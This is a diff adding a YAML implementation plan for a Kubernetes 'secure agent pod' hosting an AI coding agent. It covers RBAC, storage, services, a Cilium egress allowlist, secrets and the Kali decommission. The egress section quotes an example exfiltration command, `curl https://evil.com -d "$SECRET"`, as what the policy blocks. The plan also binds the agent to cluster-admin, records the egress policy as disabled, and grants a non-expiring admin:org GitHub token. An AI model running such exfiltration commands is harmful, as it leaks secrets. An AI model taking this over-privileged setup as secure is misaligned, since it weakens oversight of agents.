@@ -1,0 +1,727 @@
+schema_version: 2
+phase:
+  number: 1
+  title: Secure Agent Pod Implementation Plan
+  tag: agentic
+  depends_on: []
+  tracking_issue: null
+tasks:
+- number: 1
+  title: Namespace Template
+  steps:
+  - id: P1.T1.S1
+    text: |-
+      Create namespace template
+
+
+      ```yaml
+      # apps/root/templates/ns-secure-agent-pod.yaml
+      apiVersion: v1
+      kind: Namespace
+      metadata:
+        name: secure-agent-pod
+        labels:
+          pod-security.kubernetes.io/enforce: baseline
+          pod-security.kubernetes.io/audit: restricted
+          pod-security.kubernetes.io/warn: restricted
+      ```
+
+      Pod security is `baseline` (not `privileged`) — the pod runs non-root with all capabilities dropped. The `audit`/`warn` levels at `restricted` surface any future drift.
+  - id: P1.T1.S2
+    text: |-
+      Commit (cfbbf95)
+
+
+      ```bash
+      git add apps/root/templates/ns-secure-agent-pod.yaml
+      git commit -m "feat(agents): add secure-agent-pod namespace template"
+      ```
+
+      ---
+- number: 2
+  title: ServiceAccount and RBAC
+  steps:
+  - id: P1.T2.S1
+    text: |-
+      Create ServiceAccount + ClusterRoleBinding
+
+
+      ```yaml
+      # apps/secure-agent-pod/manifests/serviceaccount.yaml
+      apiVersion: v1
+      kind: ServiceAccount
+      metadata:
+        name: agent-sa
+        namespace: secure-agent-pod
+      ---
+      apiVersion: rbac.authorization.k8s.io/v1
+      kind: ClusterRoleBinding
+      metadata:
+        name: secure-agent-pod-cluster-admin
+      roleRef:
+        apiGroup: rbac.authorization.k8s.io
+        kind: ClusterRole
+        name: cluster-admin
+      subjects:
+        - kind: ServiceAccount
+          name: agent-sa
+          namespace: secure-agent-pod
+      ```
+  - id: P1.T2.S2
+    text: |-
+      Commit (54a244a)
+
+
+      ```bash
+      git add apps/secure-agent-pod/manifests/serviceaccount.yaml
+      git commit -m "feat(agents): add secure-agent-pod serviceaccount and RBAC"
+      ```
+
+      ---
+- number: 3
+  title: PVCs
+  steps:
+  - id: P1.T3.S1
+    text: |-
+      Create agent-home PVC
+
+
+      ```yaml
+      # apps/secure-agent-pod/manifests/pvc-agent-home.yaml
+      apiVersion: v1
+      kind: PersistentVolumeClaim
+      metadata:
+        name: agent-home
+        namespace: secure-agent-pod
+      spec:
+        accessModes:
+          - ReadWriteOnce
+        storageClassName: longhorn
+        resources:
+          requests:
+            storage: 50Gi
+      ```
+
+      50Gi matches the existing Kali PVC size. Uses standard `longhorn` (replicated) not `longhorn-gpu-local` — data should survive node failure.
+
+      - [x] ~~**Step 2: Create vibekanban-db PVC**~~ (removed in fd2039e — VibeKanban uses SQLite on agent-home PVC)
+  - id: P1.T3.S3
+    text: |-
+      Commit (54a244a — batched with Task 2)
+
+
+      ```bash
+      git add apps/secure-agent-pod/manifests/pvc-agent-home.yaml apps/secure-agent-pod/manifests/pvc-vibekanban-db.yaml
+      git commit -m "feat(agents): add secure-agent-pod PVCs"
+      ```
+
+      ---
+- number: 4
+  title: Core Deployment
+  steps:
+  - id: P1.T4.S1
+    text: |-
+      Create the deployment manifest (simplified from 4 containers to 1 in fd2039e)
+
+
+      See `apps/secure-agent-pod/manifests/deployment.yaml` for the current manifest (single container).
+
+      **Notes:**
+      - `agent-configs` and `agent-secrets-tier1/tier2` are `optional: true` — pod starts even without them
+      - `strategy: Recreate` — RWO PVC cannot be dual-mounted
+      - SSH host keys persist in `~/.ssh-host-keys/` on agent-home PVC
+      - SSH on port 2222 (non-root); Service maps external 22 → internal 2222
+      - VibeKanban runs as child process in local mode (SQLite on agent-home PVC, port 8081)
+  - id: P1.T4.S2
+    text: |-
+      Commit (c568c65, fix in d78581f)
+
+
+      ```bash
+      git add apps/secure-agent-pod/manifests/deployment.yaml
+      git commit -m "feat(agents): add secure-agent-pod deployment (4 containers)"
+      ```
+
+      ---
+- number: 5
+  title: Services
+  steps:
+  - id: P1.T5.S1
+    text: |-
+      Create SSH service
+
+
+      ```yaml
+      # apps/secure-agent-pod/manifests/service-ssh.yaml
+      apiVersion: v1
+      kind: Service
+      metadata:
+        name: secure-agent-ssh
+        namespace: secure-agent-pod
+        annotations:
+          lbipam.cilium.io/ips: "192.168.55.215"
+      spec:
+        type: LoadBalancer
+        selector:
+          app: secure-agent-pod
+        ports:
+          - name: ssh
+            port: 22
+            targetPort: 2222  # Non-root sshd port inside container
+            protocol: TCP
+      ```
+
+      Reuses Kali's IP `192.168.55.215`. External clients connect to port 22; traffic is forwarded to container port 2222 (non-root sshd).
+  - id: P1.T5.S2
+    text: |-
+      Create VibeKanban UI service
+
+
+      The spec says VibeKanban is accessed via Tailscale only. A LoadBalancer on the LAN makes it reachable from Tailscale subnet routes. No Caddy/public exposure.
+
+      ```yaml
+      # apps/secure-agent-pod/manifests/service-vibekanban.yaml
+      apiVersion: v1
+      kind: Service
+      metadata:
+        name: secure-agent-vibekanban
+        namespace: secure-agent-pod
+        annotations:
+          lbipam.cilium.io/ips: "192.168.55.218"
+      spec:
+        type: LoadBalancer
+        selector:
+          app: secure-agent-pod
+        ports:
+          - name: http
+            port: 8081
+            targetPort: vk-http
+            protocol: TCP
+      ```
+
+      IP `192.168.55.218` — next available after Tekton Dashboard at .217.
+  - id: P1.T5.S3
+    text: |-
+      Commit (ff37d89)
+
+
+      ```bash
+      git add apps/secure-agent-pod/manifests/service-ssh.yaml apps/secure-agent-pod/manifests/service-vibekanban.yaml
+      git commit -m "feat(agents): add secure-agent-pod services (SSH + VibeKanban)"
+      ```
+
+      ---
+- number: 6
+  title: Cilium Egress Network Policy
+  steps:
+  - id: P1.T6.S1
+    text: |-
+      Create the CiliumNetworkPolicy
+
+
+      ```yaml
+      # apps/secure-agent-pod/manifests/cilium-egress.yaml
+      apiVersion: cilium.io/v2
+      kind: CiliumNetworkPolicy
+      metadata:
+        name: agent-egress
+        namespace: secure-agent-pod
+      spec:
+        endpointSelector:
+          matchLabels:
+            app: secure-agent-pod
+        egress:
+          # DNS (required for FQDN-based rules to resolve)
+          - toEndpoints:
+              - matchLabels:
+                  k8s:io.kubernetes.pod.namespace: kube-system
+                  k8s-app: kube-dns
+            toPorts:
+              - ports:
+                  - port: "53"
+                    protocol: UDP
+
+          # Claude API
+          - toFQDNs:
+              - matchName: api.anthropic.com
+            toPorts:
+              - ports:
+                  - port: "443"
+
+          # Telegram Bot API (agent notifications)
+          - toFQDNs:
+              - matchName: api.telegram.org
+            toPorts:
+              - ports:
+                  - port: "443"
+
+          # GitHub (git clone/push, API, container registry)
+          - toFQDNs:
+              - matchName: github.com
+              - matchPattern: "*.github.com"
+              - matchName: ghcr.io
+              - matchPattern: "*.ghcr.io"
+            toPorts:
+              - ports:
+                  - port: "443"
+                  - port: "22"
+
+          # Cloudflare R2 (backup access)
+          - toFQDNs:
+              - matchPattern: "*.r2.cloudflarestorage.com"
+            toPorts:
+              - ports:
+                  - port: "443"
+
+          # npm + PyPI (dependency installs)
+          - toFQDNs:
+              - matchName: registry.npmjs.org
+              - matchName: pypi.org
+              - matchName: files.pythonhosted.org
+            toPorts:
+              - ports:
+                  - port: "443"
+
+          # Cluster-internal (LAN services, Tailscale subnet)
+          - toCIDR:
+              - 192.168.55.0/24
+              - 192.168.50.0/24
+
+          # K8s API server (kubectl from inside pod)
+          - toEntities:
+              - kube-apiserver
+      ```
+
+      **What this blocks:** All egress not in the allowlist. `curl https://evil.com -d "$SECRET"` fails at the Cilium datapath before leaving the node.
+  - id: P1.T6.S2
+    text: |-
+      Commit (a3aa519 — batched with Task 7)
+
+
+      ```bash
+      git add apps/secure-agent-pod/manifests/cilium-egress.yaml
+      git commit -m "feat(agents): add CiliumNetworkPolicy for secure-agent-pod egress"
+      ```
+
+      ---
+- number: 7
+  title: ExternalSecret (Infisical)
+  steps:
+  - id: P1.T7.S1
+    text: |-
+      Create ExternalSecret
+
+
+      ```yaml
+      # apps/secure-agent-pod/manifests/externalsecret.yaml
+      apiVersion: external-secrets.io/v1
+      kind: ExternalSecret
+      metadata:
+        name: agent-secrets-infisical
+        namespace: secure-agent-pod
+      spec:
+        refreshInterval: 1h
+        secretStoreRef:
+          name: infisical
+          kind: ClusterSecretStore
+        target:
+          name: agent-secrets-tier1
+          creationPolicy: Owner
+        data:
+          - secretKey: ANTHROPIC_API_KEY
+            remoteRef:
+              key: ANTHROPIC_API_KEY
+      ```
+
+      Populate `data` entries as secrets are added to Infisical. Start with just `ANTHROPIC_API_KEY`.
+
+      **Note:** ExternalSecret was later removed from manifests because Claude Code authenticates via Max subscription login (`claude login`), not via `ANTHROPIC_API_KEY` env var. See commit 7d02c06. Re-add this manifest when Infisical-managed secrets are needed.
+  - id: P1.T7.S2
+    text: |-
+      Commit (a3aa519 — batched with Task 6)
+
+
+      ```bash
+      git add apps/secure-agent-pod/manifests/externalsecret.yaml
+      git commit -m "feat(agents): add ExternalSecret for secure-agent-pod (Infisical)"
+      ```
+
+      ---
+- number: 8
+  title: ArgoCD Application CR
+  steps:
+  - id: P1.T8.S1
+    text: |-
+      Create Application CR template
+
+
+      ```yaml
+      # apps/root/templates/secure-agent-pod.yaml
+      apiVersion: argoproj.io/v1alpha1
+      kind: Application
+      metadata:
+        name: secure-agent-pod
+        namespace: argocd
+        finalizers:
+          - resources-finalizer.argocd.argoproj.io
+      spec:
+        project: infrastructure
+        source:
+          repoURL: {{ .Values.repoURL }}
+          targetRevision: {{ .Values.targetRevision }}
+          path: apps/secure-agent-pod/manifests
+        destination:
+          server: {{ .Values.destination.server }}
+          namespace: secure-agent-pod
+        syncPolicy:
+          automated:
+            prune: false
+            selfHeal: true
+          syncOptions:
+            - CreateNamespace=false
+            - ServerSideApply=true
+            - RespectIgnoreDifferences=true
+        ignoreDifferences:
+          - group: ""
+            kind: Secret
+            jsonPointers:
+              - /data
+      ```
+  - id: P1.T8.S2
+    text: |-
+      Commit (a0a6c15 — batched with Task 9)
+
+
+      ```bash
+      git add apps/root/templates/secure-agent-pod.yaml
+      git commit -m "feat(agents): add ArgoCD Application CR for secure-agent-pod"
+      ```
+
+      ---
+- number: 9
+  title: SOPS-Encrypted Bootstrap Secrets
+  steps:
+  - id: P1.T9.S1
+    text: |-
+      Create the secrets directory placeholder
+
+
+      ```bash
+      mkdir -p secrets/secure-agent-pod
+      echo "# SOPS-encrypted bootstrap secrets for secure-agent-pod" > secrets/secure-agent-pod/README.md
+      echo "# Apply with: sops --decrypt <file> | kubectl apply -f -" >> secrets/secure-agent-pod/README.md
+      ```
+  - id: P1.T9.S2
+    text: |-
+      Commit placeholder (a0a6c15 — batched with Task 8)
+
+
+      ```bash
+      git add secrets/secure-agent-pod/README.md
+      git commit -m "feat(agents): add secrets directory for secure-agent-pod"
+      ```
+  - id: P1.T9.S3
+    text: |-
+      Create and encrypt secrets (manual — see manual-operation block above)
+
+
+      Generate real values, SOPS-encrypt, commit the encrypted files. Apply to cluster before deploying.
+  - id: P1.T9.S4
+    text: |-
+      Migrate GITHUB_TOKEN to ESO (62b05c7)
+
+
+      Replaced SOPS-encrypted `agent-secrets-tier2` with an ExternalSecret syncing `GITHUB_SECURE_AGENT_POD` from Infisical. The secret key is still `GITHUB_TOKEN` in the K8s Secret (mapped via `remoteRef`). See `apps/secure-agent-pod/manifests/externalsecret-github-token.yaml`.
+
+      ---
+- number: 10
+  title: Configure Infisical
+  steps:
+  - id: P1.T10.S1
+    text: |-
+      Add ANTHROPIC_API_KEY to Infisical project as ANTHROPIC_API_KEY (already existed)
+  - id: P1.T10.S2
+    text: |-
+      Verify ExternalSecret syncs after deployment (confirmed: agent-secrets-tier1 created, ESO status True)
+
+
+      ---
+- number: 11
+  title: Kali Decommission
+  steps:
+  - id: P1.T11.S1
+    text: |-
+      Verify secure-agent-pod is fully operational — 6/9 PASS, 1 SKIP (Cilium), 2 pending manual (SSH + VK UI via Tailscale)
+  - id: P1.T11.S2
+    text: |-
+      Scale down Kali
+
+
+      ```bash
+      source .env
+      kubectl scale deployment kali -n kali-system --replicas=0
+      ```
+
+      Verify nothing depends on the Kali pod. Wait 24h.
+  - id: P1.T11.S3
+    text: |-
+      Remove Kali manifests and ArgoCD templates (d5b6901)
+
+
+      ```bash
+      rm -rf apps/kali/
+      rm apps/root/templates/kali.yaml
+      rm apps/root/templates/ns-kali.yaml
+      ```
+  - id: P1.T11.S4
+    text: |-
+      Update infrastructure docs (d5b6901)
+
+
+      Update `.claude/rules/frank-infrastructure.md`:
+      - Replace `Kali Workstation | 192.168.55.215 | Cilium L2 LoadBalancer (port 22/SSH)` with `Secure Agent Pod (SSH) | 192.168.55.215 | Cilium L2 LoadBalancer (port 22/SSH)`
+      - Add `Secure Agent Pod (VibeKanban) | 192.168.55.218 | Cilium L2 LoadBalancer (port 8081)`
+  - id: P1.T11.S5
+    text: |-
+      Commit (d5b6901)
+
+
+      ```bash
+      git add -A apps/kali/ apps/root/templates/kali.yaml apps/root/templates/ns-kali.yaml .claude/rules/frank-infrastructure.md
+      git commit -m "feat(agents): decommission frank-kali, replaced by secure-agent-pod"
+      ```
+  - id: P1.T11.S6
+    text: |-
+      Clean up Kali namespace (manual) — PVC, deployment, service, secrets, configmap, namespace all deleted
+
+
+      # manual-operation
+      ```yaml
+      id: secure-agent-pod-kali-cleanup
+      layer: agents
+      app: secure-agent-pod
+      plan: 2026-03-30--agents--secure-agent-pod
+      when: After Kali manifests removed and ArgoCD synced
+      why_manual: PVC data deletion is destructive and irreversible; requires human confirmation
+      status: done
+      commands:
+        - kubectl delete pvc kali-data -n kali-system
+        - kubectl delete namespace kali-system
+      verify:
+        - kubectl get namespace kali-system  # Should return "not found"
+      ```
+
+      ---
+- number: 12
+  title: Verification
+  steps:
+  - id: P1.T12.S1
+    text: |-
+      Non-root — `uid=1000(claude) gid=1000(claude)`
+  - id: P1.T12.S2
+    text: |-
+      No sudo — `sudo not found`
+  - id: P1.T12.S3
+    text: |-
+      Egress blocked — SKIP: Cilium FQDN policy temporarily disabled (Cilium 1.17 LRU bug)
+  - id: P1.T12.S4
+    text: |-
+      Egress allowed — HTTP 404 from Anthropic (connection succeeds)
+  - id: P1.T12.S5
+    text: |-
+      Secrets injected — `ANTHROPIC_API_KEY` set via ESO, no `.env` file
+  - id: P1.T12.S6
+    text: |-
+      VibeKanban healthy — process running, HTTP 200 on port 8081 (`PORT=8081`, `HOST=0.0.0.0`)
+  - id: P1.T12.S7
+    text: |-
+      PVC persistence — SSH host keys persist across pod restarts
+  - id: P1.T12.S8
+    text: |-
+      VibeKanban UI access — confirmed via Tailscale at `http://192.168.55.218:8081`
+  - id: P1.T12.S9
+    text: |-
+      SSH access — confirmed: `ssh claude@192.168.55.215`
+
+
+      ---
+
+      ## Deployment Deviations
+
+      _Document any deviations from the spec discovered during implementation here._
+
+      - **SSH port:** Container uses port 2222 (non-root cannot bind port 22). Service maps external 22 → internal 2222. No functional difference for SSH clients.
+      - **ESO API version:** Spec uses `v1beta1`, cluster uses `v1`. Plan uses `v1`.
+      - **SecretStore scope:** Spec creates a namespace-scoped `SecretStore`. Cluster already has `ClusterSecretStore: infisical`. Plan reuses the existing ClusterSecretStore.
+      - **VibeKanban LB service:** Spec says Tailscale-only access with no Caddy. Plan adds a LAN-facing LoadBalancer (reachable via Tailscale subnet routes) at `192.168.55.218:8081`.
+      - **Pod security baseline:** Spec doesn't specify namespace PSS level. Plan uses `baseline` (enforce) with `restricted` (audit/warn).
+      - **VibeKanban architecture:** Spec originally designed 3-container sidecar (server + PostgreSQL + ElectricSQL). Testing revealed remote-server doesn't expose local workspace to sessions. Simplified to in-container process using local mode (SQLite). Removed Prereq B, vibekanban-db PVC, vibekanban-secrets, and 3 sidecar container definitions.
+      - **Infisical key name:** Spec used `SECURE_AGENT_ANTHROPIC_API_KEY`. Existing Infisical project uses `ANTHROPIC_API_KEY`. Updated ExternalSecret to match.
+      - **VibeKanban port binding:** Defaults to random port with `HOST=127.0.0.1`. Required `PORT=8081` and `HOST=0.0.0.0` env vars in deployment for fixed port and external access.
+      - **PVC mount path conflict:** `/run/secrets` mount for agent-configs conflicted with K8s SA token mount at `/var/run/secrets/kubernetes.io/serviceaccount`. Moved to `/home/claude/.kube/configs`.
+      - **Image files hidden by PVC:** All files Dockerfile placed under `/home/claude/` (entrypoint, sshd_config, .crontab, .load-env.sh) are hidden by the PVC mount. Moved to `/opt/` and `/entrypoint.sh`; entrypoint seeds PVC on first boot.
+      - **Cilium FQDN egress policy:** Invalid on Cilium 1.17 ("LRU not yet initialized"). Temporarily disabled — manifests moved to `cilium-egress.yaml.disabled`. Re-enable after Cilium upgrade or workaround found.
+      - **ExternalSecret removed:** Claude Code authenticates via Max subscription login, not ANTHROPIC_API_KEY env var. ExternalSecret manifest deleted (7d02c06). Re-add when Infisical-managed secrets are needed.
+      - **GitHub CLI added:** `gh` not in Kali base repos — requires adding the official GitHub CLI apt repository before installing. Added in image `22a2915`.
+      - **GITHUB_TOKEN migrated to ESO:** `agent-secrets-tier2` was originally a SOPS-encrypted manual secret. Replaced with an ExternalSecret (62b05c7) syncing `GITHUB_SECURE_AGENT_POD` from Infisical as `GITHUB_TOKEN`. Originally a fine-grained PAT; replaced with a classic PAT (2026-04-05) for `clawdia-ai-assistant` with `repo`, `write:packages`, `workflow`, `project`, `admin:org` scopes — no expiry. See `willikins/docs/superpowers/specs/2026-04-05-github-token-replacement-design.md`.
+      - **Image pinned to SHA:** Deployment image changed from `:latest` to `:22a2915` (56b15a3). SHA tags are pushed alongside `latest` by the GitHub Actions build workflow.
+      - **Git identity:** Pod uses `Clawdia <clawdia-ai-assistant@gmail.com>` for git commits, matching the GitHub bot user. Git credential helper configured to use `$GITHUB_TOKEN` dynamically (no PAT embedded in remote URLs).
+      - **Agent scripts baked into image (2026-04-04):** Pod infrastructure scripts (guardrails hook, session manager, exercise cron, audit digest, Telegram notifications, heartbeat push) moved from `willikins/scripts/willikins-agent/` to the `secure-agent-kali` image at `/opt/scripts/` (immutable, always from image). Config templates (crontab, `.bashrc`, `settings.json`) baked at `/opt/` and seeded to PVC on first boot (user-modifiable). Bug fixes: exercise schedule `1-5` → `0,1,5,6` (Fri-Mon), audit digest heartbeat on empty-log path, `.bashrc` extracts secrets from `/proc/1/environ` instead of hardcoding.
+state:
+  steps:
+    P1.T1.S1:
+      state: x
+      ticked_at: null
+      note: null
+    P1.T1.S2:
+      state: x
+      ticked_at: null
+      note: null
+    P1.T2.S1:
+      state: x
+      ticked_at: null
+      note: null
+    P1.T2.S2:
+      state: x
+      ticked_at: null
+      note: null
+    P1.T3.S1:
+      state: x
+      ticked_at: null
+      note: null
+    P1.T3.S3:
+      state: x
+      ticked_at: null
+      note: null
+    P1.T4.S1:
+      state: x
+      ticked_at: null
+      note: null
+    P1.T4.S2:
+      state: x
+      ticked_at: null
+      note: null
+    P1.T5.S1:
+      state: x
+      ticked_at: null
+      note: null
+    P1.T5.S2:
+      state: x
+      ticked_at: null
+      note: null
+    P1.T5.S3:
+      state: x
+      ticked_at: null
+      note: null
+    P1.T6.S1:
+      state: x
+      ticked_at: null
+      note: null
+    P1.T6.S2:
+      state: x
+      ticked_at: null
+      note: null
+    P1.T7.S1:
+      state: x
+      ticked_at: null
+      note: null
+    P1.T7.S2:
+      state: x
+      ticked_at: null
+      note: null
+    P1.T8.S1:
+      state: x
+      ticked_at: null
+      note: null
+    P1.T8.S2:
+      state: x
+      ticked_at: null
+      note: null
+    P1.T9.S1:
+      state: x
+      ticked_at: null
+      note: null
+    P1.T9.S2:
+      state: x
+      ticked_at: null
+      note: null
+    P1.T9.S3:
+      state: x
+      ticked_at: null
+      note: null
+    P1.T9.S4:
+      state: x
+      ticked_at: null
+      note: null
+    P1.T10.S1:
+      state: x
+      ticked_at: null
+      note: null
+    P1.T10.S2:
+      state: x
+      ticked_at: null
+      note: null
+    P1.T11.S1:
+      state: x
+      ticked_at: null
+      note: null
+    P1.T11.S2:
+      state: x
+      ticked_at: null
+      note: null
+    P1.T11.S3:
+      state: x
+      ticked_at: null
+      note: null
+    P1.T11.S4:
+      state: x
+      ticked_at: null
+      note: null
+    P1.T11.S5:
+      state: x
+      ticked_at: null
+      note: null
+    P1.T11.S6:
+      state: x
+      ticked_at: null
+      note: null
+    P1.T12.S1:
+      state: x
+      ticked_at: null
+      note: null
+    P1.T12.S2:
+      state: x
+      ticked_at: null
+      note: null
+    P1.T12.S3:
+      state: ' '
+      ticked_at: null
+      note: null
+    P1.T12.S4:
+      state: x
+      ticked_at: null
+      note: null
+    P1.T12.S5:
+      state: x
+      ticked_at: null
+      note: null
+    P1.T12.S6:
+      state: x
+      ticked_at: null
+      note: null
+    P1.T12.S7:
+      state: x
+      ticked_at: null
+      note: null
+    P1.T12.S8:
+      state: x
+      ticked_at: null
+      note: null
+    P1.T12.S9:
+      state: x
+      ticked_at: null
+      note: null
+  completion:
+    at: null
+    note: null
+    observed_prs: []
